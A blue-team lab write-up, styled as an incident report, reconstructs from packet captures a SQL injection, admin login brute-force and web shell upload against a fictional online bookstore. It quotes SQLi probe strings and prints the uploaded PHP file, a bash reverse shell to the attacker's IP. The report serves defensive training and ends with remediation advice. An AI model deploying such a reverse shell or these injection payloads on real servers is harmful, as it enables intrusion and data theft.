# Incident Report: Web Server Compromise via SQL Injection — BookWorld

**Author:** Teejay Kongolo
**Lab source:** CyberDefenders — Web Investigation (Blue Team Labs, Network Forensics)
**Tools used:** Wireshark
**Scenario:** SOC analyst at BookWorld, an online bookstore, investigating an automated alert triggered by an unusual spike in database queries and server resource usage.

---

## 1. Objective

Analyze a network traffic capture (`WebInvestigation.pcap`) to reconstruct a live attack against BookWorld's web server — identify the attacker, the vulnerability exploited, the scope of data accessed, and whether the attacker gained further control of the system.

## 2. Methodology

All analysis was performed in Wireshark using targeted display filters to isolate attacker traffic from normal site traffic, then following individual HTTP streams to read full request/response content.

## 3. Findings

### 3.1 Identifying the Attacker

**Filter used:**
```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```
This isolates SYN packets without a corresponding ACK — a pattern consistent with a high volume of connection attempts from a single source. This revealed a large number of requests originating from a single IP.

**Attacker IP:** `111.224.250.131`
**Geolocation:** Shijiazhuang, Hebei, China (ChinaNet Hebei Province Network) — a location with no expected business relationship to the site, supporting the assessment that this was a targeted external attack rather than legitimate traffic.

### 3.2 Identifying the Vulnerable Entry Point

**Filter used:**
```
http contains ".php"
```

Scanning the attacker's requests showed repeated manipulation of the `search` parameter on `search.php`, escalating from simple test values (`test`, `book`) to SQL syntax probes (`book%27`, `book%20and%201=1`).

**Vulnerable script:** `search.php`
**First confirmed SQL injection attempt (packet 357):**
```
/search.php?search=book%20and%201=1;%20--%20-
```
This is a classic boolean-based SQLi probe — testing whether the application's response changes when a true (`1=1`) condition is injected, which confirms the parameter is not sanitized before reaching the database.

### 3.3 Database Enumeration

Once the injection point was confirmed, the attacker moved to a UNION-based injection technique to extract data directly in the HTTP response, using MySQL's `JSON_ARRAYAGG` function to pull back multiple values in a single request.

**Databases discovered:**
```
["mysql", "information_schema", "performance_schema", "sys", "bookworld_db"]
```
`bookworld_db` was the only application-specific database — the clear target for further enumeration.

**Tables discovered inside `bookworld_db`:**
```
["admin", "books", "customers"]
```

**Table containing user data:** `customers`

Notably, all of the attacker's requests carried the User-Agent `sqlmap/1.8.3` — confirming this stage of the attack was automated using the SQLMap tool rather than manually crafted, which is itself a useful detection signal for SOC monitoring (a legitimate customer's browser would never send this User-Agent string).

### 3.4 Admin Panel Compromise

**Filter used:**
```
http.request.method == POST
```

The attacker sent multiple POST requests to `/admin/login.php`, attempting different credential pairs. The first attempt (`admin:admin`) returned an HTTP `200 OK` with the message "Invalid username or password" — a failed login. A subsequent attempt succeeded:

**Valid credentials used:** `admin:admin123!`

This attempt returned an HTTP `302 Found` redirecting to `index.php`, with no error message — and the following GET request to `/admin/index.php` returned `200 OK` with "Welcome to the Admin Dashboard," confirming successful authentication.

### 3.5 Full Server Compromise (Web Shell Upload)

The admin dashboard exposed a file upload feature. The attacker used it to upload a malicious PHP file.

**Filter used:**
```
mime_multipart.header.content-type == "application/x-php"
```

**Malicious file uploaded:** `NVri2vhp.php`

**File contents:**
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'");?>
```

This is a reverse shell payload. Once executed on the server, it opens an outbound connection from the server back to the attacker's machine (`111.224.250.131`) on port 443, giving the attacker an interactive command shell with the same privileges as the web server process — effectively full control of the host.

## 4. Attack Timeline Summary

| Stage | Action | Evidence |
|---|---|---|
| 1 | Reconnaissance / parameter probing | Repeated requests to `search.php` with test values |
| 2 | SQL injection confirmed | Boolean-based probe `book%20and%201=1` (packet 357) |
| 3 | Database enumeration | UNION-based injection reveals `bookworld_db` |
| 4 | Table enumeration | Reveals `admin`, `books`, `customers` tables |
| 5 | Credential brute-force | Failed attempt (`admin:admin`), then success (`admin:admin123!`) |
| 6 | Privilege escalation via legitimate feature | Admin panel's file upload abused to place a web shell |
| 7 | Full compromise | Reverse shell (`NVri2vhp.php`) grants remote command execution |

## 5. Impact Assessment

- **Data exposure:** The `customers` table was directly reachable via SQL injection, meaning any data stored there (names, emails, likely payment-related information for an e-commerce site) was at risk of exfiltration.
- **Account compromise:** The admin account was compromised via a weak, guessable password (`admin123!`), granting the attacker legitimate administrative access.
- **Full server compromise:** The uploaded web shell gives the attacker command-line access to the server itself, not just the application — this goes beyond a data breach into full infrastructure compromise.

## 6. Recommendations

1. **Parameterize all SQL queries** on `search.php` and every other user-input field — the root cause of this entire chain was an unsanitized `search` parameter.
2. **Enforce strong password policies** on admin accounts; `admin123!` should never pass a minimum complexity check.
3. **Restrict file upload functionality** — validate file type server-side (not just by extension), store uploads outside the web root, and disable script execution in the upload directory.
4. **Add rate-limiting / alerting on repeated failed logins** to `/admin/login.php` to catch brute-force attempts before they succeed.
5. **Monitor for known malicious tool signatures** — the `sqlmap` User-Agent string in this capture would have been an easy, early detection opportunity if User-Agent monitoring was in place.
6. **Web Application Firewall (WAF)** in front of the application would likely have blocked the majority of these injection attempts at the network edge before they reached the application.

## 7. What I'd do differently next time

Set up alerting rules based on this investigation — for example, flagging any User-Agent matching known scanning/exploitation tools (sqlmap, nikto, etc.), and flagging repeated `INFORMATION_SCHEMA` references in query strings, since both would have caught this attack far earlier in the chain.

---
*Lab completed as part of self-directed SOC Analyst training via CyberDefenders' free Blue Team Labs.*
